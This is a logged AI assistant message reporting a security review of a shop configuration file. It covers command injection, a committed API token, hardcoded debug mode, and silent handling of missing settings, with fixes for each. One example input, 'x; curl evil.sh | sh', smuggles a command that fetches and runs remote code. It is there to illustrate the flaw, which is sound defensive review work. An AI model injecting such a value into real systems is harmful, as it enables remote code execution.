{"type": "assistant", "message": {"model": "claude-haiku-5-5", "id": "msg_011CgV8u3z4JbpWqvrST1Jwd", "type": "message", "role": "assistant", "content": [{"type": "text", "text": "I found three issues in `shop/config.py`. The most serious is the command injection on line 15.\n\n1. **Command injection (CWE-78), `config.py:15`, high.** `backup_database` builds a shell command by concatenating `target_dir`, which comes from the admin web form, and runs it with `shell=True`. A value like `x; curl evil.sh | sh` runs arbitrary commands as the app user. Admin-only input lowers the risk, but a compromised admin session or a CSRF hit would still reach it. Fix it by passing an argument list with no shell and building the path in Python:\n   ```python\n   subprocess.run([\"pg_dump\", \"shop\", \"-f\", os.path.join(target_dir, \"shop.sql\")], check=True)\n   ```\n   Also validate that `target_dir` is an existing directory under an allowed base path.\n\n2. **Hardcoded credential (CWE-798), `config.py:5`, high.** `ACME_API_TOKEN` is a live-looking token committed to source. Anyone with repo access, or anyone who reads the git history, has it. Load it with `load_setting(\"ACME_API_TOKEN\")` instead. Because the token is already in history, treat it as compromised and rotate it.\n\n3. **Debug mode hardcoded on (CWE-489), `config.py:6`, medium.** `DEBUG = True` is set unconditionally. If it reaches production, it can expose stack traces and debug consoles. Read it from the environment and default to `False`, for example `DEBUG = load_setting(\"DEBUG\").lower() == \"true\"`.\n\nThere is also a smaller issue. `load_setting` returns `\"\"` for a missing variable, so a missing secret fails silently. Raise an error when a required setting is absent.\n\nI only reviewed the file and did not make changes or write a SECURITY_FINDINGS.md entry. I can apply the fixes and add the findings to that file if you want."}], "container": null, "stop_reason": null, "stop_sequence": null, "stop_details": null, "usage": {"input_tokens": 2, "cache_creation_input_tokens": 425, "cache_read_input_tokens": 38368, "cache_creation": {"ephemeral_5m_input_tokens": 0, "ephemeral_1h_input_tokens": 425}, "output_tokens": 3, "service_tier": "standard", "inference_geo": "global", "speed": "standard"}, "input_transformations": [], "diagnostics": null, "context_management": null}, "parent_tool_use_id": null, "timestamp": "2026-10-28T18:50:10.666Z", "request_id": "req_011CgV8u3bzKYczqg2Bp6ksA"}
